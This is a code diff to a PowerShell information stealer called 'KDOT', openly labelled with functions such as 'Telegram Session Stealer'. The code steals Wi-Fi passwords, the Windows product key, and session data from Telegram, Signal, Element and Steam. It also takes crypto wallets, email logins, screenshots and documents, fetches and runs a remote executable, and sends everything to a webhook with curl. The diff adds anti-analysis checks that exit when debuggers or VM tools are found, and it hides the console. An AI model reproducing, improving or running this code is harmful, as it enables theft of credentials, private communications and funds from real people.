@@ -1,3 +1,6 @@
+﻿$ErrorActionPreference = 'SilentlyContinue' # Ignore all warnings
+$ProgressPreference = 'SilentlyContinue' # Hide all Progresses
+
 function CHECK_IF_ADMIN {
     $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test
 }
@@ -28,7 +31,6 @@ function EXFILTRATE-DATA {
     $username = $env:USERNAME
     $hostname = $env:COMPUTERNAME
     $netstat = netstat -ano > $env:LOCALAPPDATA\Temp\netstat.txt
-	
 	$mfg = (gwmi win32_computersystem).Manufacturer 
 	
 	# System Uptime
@@ -40,7 +42,6 @@ function EXFILTRATE-DATA {
     $uptime = Get-Uptime
 	
 	# List of Installed AVs
-	
 	function get-installed-av {
     $wmiQuery = "SELECT * FROM AntiVirusProduct"
     $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters 
@@ -48,39 +49,32 @@ function EXFILTRATE-DATA {
     }
     $avlist = get-installed-av -autosize | ft | out-string
     
+	# Extracts all Wifi Passwords
     $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | out-string
     $wifi = $wifipasslist | out-string 
     $wifi > $env:temp\WIFIPasswords.txt
 	
 	# Screen Resolution
-
     $width = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[0]
     $height = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[2]  
     $split = "x"
     $screen = "$width" + "$split" + "$height"  
     $screen
     
+	# Startup Apps , Running Services, Processes, Installed Applications, and Network Adapters
+	function misc {
     Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List > $env:temp\StartUpApps.txt
-    
     Get-WmiObject win32_service |? State -match "running" | select Name, DisplayName, PathName, User | sort Name | ft -wrap -autosize >  $env:LOCALAPPDATA\Temp\running-services.txt
-    
     Get-WmiObject win32_process | Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path | ft -wrap -autosize > $env:temp\running-applications.txt
-    
     Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > $env:temp\Installed-Applications.txt
-    
     Get-NetAdapter | ft Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize > $env:temp\NetworkAdapters.txt
-
-    # Telegram Session Stealer
+	}
+	misc 
 	
+    # Telegram Session Stealer
 	function telegramstealer {
     $processName = "telegram"
-    try {
-        if (Get-Process $processName -ErrorAction SilentlyContinue) {
-            Get-Process -Name $processName | Stop-Process
-        }
-    } catch {
-     
-    }
+    try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
     $path = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
     $destination = "$env:localappdata\temp\telegram-session.zip"
     $exclude = @("_*.config","dumps","tdummy","emoji","user_data","user_data#2","user_data#3","user_data#4","user_data#5","user_data#6","*.json","webview")
@@ -91,77 +85,56 @@ function EXFILTRATE-DATA {
 	
 	# Element Session Stealer
     function elementstealer {
-        $processName = "element"
-        try {
-            if (Get-Process $processName -ErrorAction SilentlyContinue) {
-                Get-Process -Name $processName | Stop-Process
-            }
-        } catch {
-         
-        }
-        $element_session = "$env:localappdata\temp\element-session"
-         New-Item -ItemType Directory -Force -Path $element_session
-         $elementfolder = "$env:userprofile\AppData\Roaming\Element"
-         Copy-Item -Path "$elementfolder\databases" -Destination $element_session -Recurse -force
-         Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force
-         Copy-Item -Path "$elementfolder\Session Storage" -Destination $element_session -Recurse -force
-         Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force
-         Copy-Item -Path "$elementfolder\sso-sessions.json" -Destination $element_session -Recurse -force
-         $signal_zip = "$env:localappdata\temp\element-session.zip"
-         Compress-Archive -Path $element_session -DestinationPath $signal_zip -CompressionLevel Fastest
+    $processName = "element"
+    try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
+    $element_session = "$env:localappdata\temp\element-session"
+    New-Item -ItemType Directory -Force -Path $element_session
+    $elementfolder = "$env:userprofile\AppData\Roaming\Element"
+    Copy-Item -Path "$elementfolder\databases" -Destination $element_session -Recurse -force
+    Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force
+    Copy-Item -Path "$elementfolder\Session Storage" -Destination $element_session -Recurse -force
+    Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force
+    Copy-Item -Path "$elementfolder\sso-sessions.json" -Destination $element_session -Recurse -force
+    $signal_zip = "$env:localappdata\temp\element-session.zip"
+    Compress-Archive -Path $element_session -DestinationPath $signal_zip -CompressionLevel Fastest
     }
     elementstealer 
 	
 	# Signal Session Stealer
     function signalstealer {
-         $processName = "Signal"
-         try {
-             if (Get-Process $processName -ErrorAction SilentlyContinue) {
-                 Get-Process -Name $processName | Stop-Process
-             }
-         } catch {
-          
-         }
-         $signal_session = "$env:localappdata\temp\signal-session"
-          New-Item -ItemType Directory -Force -Path $signal_session
-          $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
-          Copy-Item -Path "$signalfolder\databases" -Destination $signal_session -Recurse -force
-          Copy-Item -Path "$signalfolder\Local Storage" -Destination $signal_session -Recurse -force
-          Copy-Item -Path "$signalfolder\Session Storage" -Destination $signal_session -Recurse -force
-          Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
-          Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
-          $signal_zip = "$env:localappdata\temp\signal-session.zip"
-          Compress-Archive -Path $signal_session -DestinationPath $signal_zip -CompressionLevel Fastest
-     }
-     signalstealer 
+    $processName = "Signal"
+    try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
+    $signal_session = "$env:localappdata\temp\signal-session"
+    New-Item -ItemType Directory -Force -Path $signal_session
+    $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
+    Copy-Item -Path "$signalfolder\databases" -Destination $signal_session -Recurse -force
+    Copy-Item -Path "$signalfolder\Local Storage" -Destination $signal_session -Recurse -force
+    Copy-Item -Path "$signalfolder\Session Storage" -Destination $signal_session -Recurse -force
+    Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
+    Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
+    $signal_zip = "$env:localappdata\temp\signal-session.zip"
+    Compress-Archive -Path $signal_session -DestinationPath $signal_zip -CompressionLevel Fastest
+    }
+    signalstealer 
 	 
-     # Steam Session Stealer
-	 function steamstealer {
-         $processName = "steam"
-         try {
-             if (Get-Process $processName -ErrorAction SilentlyContinue) {
-                 Get-Process -Name $processName | Stop-Process
-             }
-         } catch {
-          
-         }
-         $steam_session = "$env:localappdata\temp\steam-session"
-         New-Item -ItemType Directory -Force -Path $steam_session
-         $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
-         Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
-		 $ssfnfiles = @("ssfn$1")
-         foreach($file in $ssfnfiles) {
-         Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach { Copy-Item -path $PSItem.FullName -Destination $steam_session }
-         }
-
-		  $steam_zip = "$env:localappdata\temp\steam-session.zip"
-         Compress-Archive -Path $steam_session -DestinationPath $steam_zip -CompressionLevel Fastest
-         }
-       steamstealer 
-     
-    
-	# Desktop screenshot
+    # Steam Session Stealer
+	function steamstealer {
+     $processName = "steam"
+     try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
+     $steam_session = "$env:localappdata\temp\steam-session"
+     New-Item -ItemType Directory -Force -Path $steam_session
+     $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
+     Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
+	 $ssfnfiles = @("ssfn$1")
+     foreach($file in $ssfnfiles) {
+     Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach { Copy-Item -path $PSItem.FullName -Destination $steam_session }
+     }
+	 $steam_zip = "$env:localappdata\temp\steam-session.zip"
+     Compress-Archive -Path $steam_session -DestinationPath $steam_zip -CompressionLevel Fastest
+     }
+     steamstealer 
 	
+	# Desktop screenshot
     Add-Type -AssemblyName System.Windows.Forms,System.Drawing
     $screens = [Windows.Forms.Screen]::AllScreens
     $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
@@ -176,13 +149,14 @@ function EXFILTRATE-DATA {
     $graphics.Dispose()
     $bmp.Dispose()
 	
+	# Disk Information
     function diskdata {
     $disks = get-wmiobject -class "Win32_LogicalDisk" -namespace "root\CIMV2"
     $results = foreach ($disk in $disks) {
         if ($disk.Size -gt 0) {
             $SizeOfDisk = [math]::round($disk.Size/1GB, 0)
             $FreeSpace = [math]::round($disk.FreeSpace/1GB, 0)
-            $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
+    		$usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
             [int]$FreePercent = ($FreeSpace/$SizeOfDisk) * 100
 			[int]$usedpercent = ($usedspace/$SizeOfDisk) * 100
             [PSCustomObject]@{
@@ -198,7 +172,8 @@ function EXFILTRATE-DATA {
     }
     $alldiskinfo = diskdata
     $alldiskinfo > $env:temp\DiskInfo.txt
-
+    
+	#Extracts Product Key
     function Get-ProductKey {
       $map="BCDFGHJKMPQRTVWXY2346789"
       $value = (get-itemproperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").digitalproductid[0x34..0x42]
@@ -219,13 +194,13 @@ function EXFILTRATE-DATA {
       $ProductKey
     }
     $ProductKey = Get-ProductKey
-    Get-ProductKey > $env:localappdata\temp\ProductKey.txt
+    Get-ProductKey > $env:localappdata\temp\ProductKey.txt	
 	
+	# Create temporary directory to store wallet data for exfiltration
 	New-Item -Path "$env:localappdata\Temp" -Name "Crypto Wallets" -ItemType Directory -force | out-null
 	$crypto = "$env:localappdata\Temp\Crypto Wallets"
 
     # Thunderbird Exfil
-	
     $Thunderbird = @('key4.db', 'key3.db', 'logins.json', 'cert9.db')
     If (Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles") {
     New-Item -Path "$crypto\Thunder" -ItemType Directory | Out-Null
@@ -292,8 +267,7 @@ function EXFILTRATE-DATA {
     Get-ChildItem "$env:userprofile\AppData\Roaming\Zcash" -Recurse | Copy-Item -Destination "$crypto\Zcash" -Recurse -Force
     }
 
-    #Files Grabber
-    
+    #Files Grabber 
 	New-Item -Path "$env:localappdata\Temp" -Name "Files Grabber" -ItemType Directory -force | out-null
 	$filegrabber = "$env:localappdata\Temp\Files Grabber"
 	Function GrabFiles {
@@ -332,11 +306,10 @@ function EXFILTRATE-DATA {
     )
     $dest = "$env:localappdata\Temp\Files Grabber"
     $paths = "$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop"
-    [regex] $grab_regex = '(' + (($grabber |foreach {[regex]::escape($_)}) -join "|") + ")"
+    [regex] $grab_regex = "(" + (($grabber |foreach {[regex]::escape($_)}) –join "|") + ")"
     (gci -path $paths -Include "*.pdf","*.txt","*.doc","*.csv","*.rtf","*.docx" -r | ? Length -lt 5mb) -match $grab_regex | Copy-Item -Destination $dest -Force
     }
     GrabFiles
-    
     
     $embed_and_body = @{
         "username" = "KDOT"
@@ -411,38 +384,38 @@ function EXFILTRATE-DATA {
         New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory
     }
     
-    $ProgressPreference = "SilentlyContinue";Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.1/main.exe" -OutFile "main.exe" -UseBasicParsing
+    Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.1/main.exe" -OutFile "main.exe" -UseBasicParsing
 
     $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
     $proc.WaitForExit()
 
     $extracted = "$env:LOCALAPPDATA\Temp"
-    Move-Item -Path "$extracted\ip.txt" -Destination "$extracted\KDOT\ip.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\netstat.txt" -Destination "$extracted\KDOT\netstat.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\system_info.txt" -Destination "$extracted\KDOT\system_info.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\uuid.txt" -Destination "$extracted\KDOT\uuid.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\mac.txt" -Destination "$extracted\KDOT\mac.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\browser-cookies.txt" -Destination "$extracted\KDOT\browser-cookies.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\browser-history.txt" -Destination "$extracted\KDOT\browser-history.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\browser-passwords.txt" -Destination "$extracted\KDOT\browser-passwords.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\desktop-screenshot.png" -Destination "$extracted\KDOT\desktop-screenshot.png" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\tokens.txt" -Destination "$extracted\KDOT\tokens.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\WIFIPasswords.txt" -Destination "$extracted\KDOT\WIFIPasswords.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\GPU.txt" -Destination "$extracted\KDOT\GPU.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\Installed-Applications.txt" -Destination "$extracted\KDOT\Installed-Applications.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\DiskInfo.txt" -Destination "$extracted\KDOT\DiskInfo.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\CPU.txt" -Destination "$extracted\KDOT\CPU.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\NetworkAdapters.txt" -Destination "$extracted\KDOT\NetworkAdapters.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\ProductKey.txt" -Destination "$extracted\KDOT\ProductKey.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\StartUpApps.txt" -Destination "$extracted\KDOT\StartUpApps.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\KDOT\running-services.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\KDOT\running-applications.txt" -ErrorAction SilentlyContinue
-	Move-Item -Path "$extracted\telegram-session.zip" -Destination "$extracted\KDOT\telegram-session.zip" -ErrorAction SilentlyContinue
-	Move-Item -Path "$extracted\element-session.zip" -Destination "$extracted\KDOT\element-session.zip" -ErrorAction SilentlyContinue
-	Move-Item -Path "$extracted\signal-session.zip" -Destination "$extracted\KDOT\signal-session.zip" -ErrorAction SilentlyContinue
-	Move-Item -Path "$extracted\steam-session.zip" -Destination "$extracted\KDOT\steam-session.zip" -ErrorAction SilentlyContinue
-	Move-Item -Path "Files Grabber" -Destination "$extracted\KDOT\Files Grabber" -ErrorAction SilentlyContinue
-	Move-Item -Path "Crypto Wallets" -Destination "$extracted\KDOT\Crypto Wallets" -ErrorAction SilentlyContinue
+    Move-Item -Path "$extracted\ip.txt" -Destination "$extracted\KDOT\ip.txt" 
+    Move-Item -Path "$extracted\netstat.txt" -Destination "$extracted\KDOT\netstat.txt" 
+    Move-Item -Path "$extracted\system_info.txt" -Destination "$extracted\KDOT\system_info.txt" 
+    Move-Item -Path "$extracted\uuid.txt" -Destination "$extracted\KDOT\uuid.txt" 
+    Move-Item -Path "$extracted\mac.txt" -Destination "$extracted\KDOT\mac.txt" 
+    Move-Item -Path "$extracted\browser-cookies.txt" -Destination "$extracted\KDOT\browser-cookies.txt" 
+    Move-Item -Path "$extracted\browser-history.txt" -Destination "$extracted\KDOT\browser-history.txt" 
+    Move-Item -Path "$extracted\browser-passwords.txt" -Destination "$extracted\KDOT\browser-passwords.txt" 
+    Move-Item -Path "$extracted\desktop-screenshot.png" -Destination "$extracted\KDOT\desktop-screenshot.png" 
+    Move-Item -Path "$extracted\tokens.txt" -Destination "$extracted\KDOT\tokens.txt" 
+    Move-Item -Path "$extracted\WIFIPasswords.txt" -Destination "$extracted\KDOT\WIFIPasswords.txt" 
+    Move-Item -Path "$extracted\GPU.txt" -Destination "$extracted\KDOT\GPU.txt" 
+    Move-Item -Path "$extracted\Installed-Applications.txt" -Destination "$extracted\KDOT\Installed-Applications.txt" 
+    Move-Item -Path "$extracted\DiskInfo.txt" -Destination "$extracted\KDOT\DiskInfo.txt" 
+    Move-Item -Path "$extracted\CPU.txt" -Destination "$extracted\KDOT\CPU.txt" 
+    Move-Item -Path "$extracted\NetworkAdapters.txt" -Destination "$extracted\KDOT\NetworkAdapters.txt" 
+    Move-Item -Path "$extracted\ProductKey.txt" -Destination "$extracted\KDOT\ProductKey.txt" 
+    Move-Item -Path "$extracted\StartUpApps.txt" -Destination "$extracted\KDOT\StartUpApps.txt" 
+    Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\KDOT\running-services.txt" 
+    Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\KDOT\running-applications.txt" 
+	Move-Item -Path "$extracted\telegram-session.zip" -Destination "$extracted\KDOT\telegram-session.zip" 
+	Move-Item -Path "$extracted\element-session.zip" -Destination "$extracted\KDOT\element-session.zip" 
+	Move-Item -Path "$extracted\signal-session.zip" -Destination "$extracted\KDOT\signal-session.zip" 
+	Move-Item -Path "$extracted\steam-session.zip" -Destination "$extracted\KDOT\steam-session.zip" 
+	Move-Item -Path "Files Grabber" -Destination "$extracted\KDOT\Files Grabber" 
+	Move-Item -Path "Crypto Wallets" -Destination "$extracted\KDOT\Crypto Wallets" 
     Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\KDOT.zip" -Force
     curl.exe -X POST -F 'payload_json={\"username\": \"POWERSHELL GRABBER\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/m2SSKrBt/Logo.gif\"}' -F "file=@$extracted\KDOT.zip" $webhook
     Remove-Item "$extracted\KDOT.zip"
@@ -474,8 +447,6 @@ function Invoke-TASKS {
     EXFILTRATE-DATA
 }
 
-
-
 function Request-Admin {
     while(!(CHECK_IF_ADMIN)) {
         try {
@@ -484,6 +455,63 @@ function Request-Admin {
         }
         catch {}
     }
+}
+
+function Invoke-ANTIVM {
+function antivm
+{
+   "autoruns",
+   "autorunsc",
+   "dumpcap",
+   "Fiddler",
+   "fakenet",
+   "hookexplorer",
+   "immunitydebugger",
+   "httpdebugger",
+   "importrec",
+   "lordpe",
+   "petools",
+   "processhacker",
+   "resourcehacker",
+   "scylla_x64",
+   "sandman",
+   "sysinspector",
+   "tcpview",
+   "die",
+   "dumpcap",
+   "filemon",
+   "idaq",
+   "idaq64",
+   "joeboxcontrol",
+   "joeboxserver",
+   "ollydbg",
+   "proc_analyzer",
+   "procexp",
+   "procmon",
+   "pestudio",
+   "qemu-ga",
+   "qga",
+   "regmon",
+   "sniff_hit",
+   "sysanalyzer",
+   "tcpview",
+   "windbg",
+   "wireshark",
+   "x32dbg",
+   "x64dbg",
+   "vmwareuser",
+   "vmacthlp",
+   "vboxservice",
+   "vboxtray",
+   "xenservice"
+}
+$processnames = antivm
+if(($processnames | ForEach-Object {Get-Process -Name $_ }) -eq $null){ 
+   Invoke-TASKS 
+}
+else{ 
+  exit
+}
 }
 
 function Hide-Console
@@ -500,10 +528,9 @@ function Hide-Console
     $null = [Console.Window]::ShowWindow($consolePtr, 0)
 }
 
-
 if (CHECK_IF_ADMIN -eq $true) {
     Hide-Console
-    Invoke-TASKS
+    Invoke-ANTIVM
     # Self-Destruct
 	# Remove-Item $PSCommandPath -Force 
 } else {
